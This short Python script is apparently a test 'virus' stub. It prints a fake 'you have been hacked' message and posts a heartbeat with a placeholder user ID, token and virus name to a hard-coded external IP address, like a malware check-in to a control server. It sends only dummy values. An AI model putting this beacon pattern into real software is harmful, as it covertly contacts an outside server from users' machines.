
import os
import requests

def display_message(user_id, virus_type):
    os.system('echo You have been hacked by user: 1 with virus: Silent! (Not really) && pause'.format(user_id, virus_type))

def send_request(user_id, token, virus_type, name, heartbeat_rate):
    url = 'http://129.151.211.93:5000/update'
    data = {
        'user_id': '1',
        'token': '1234567890',
        'virus_type': 'Silent',
        'name': 'TestVirus1',
        'heartbeat_rate': '1h',
    }
    response = requests.post(url, json=data)

display_message(user_id='1', virus_type='Silent')
send_request(user_id='1', token='1234567890', virus_type='Silent', name='TestVirus1', heartbeat_rate='1h')
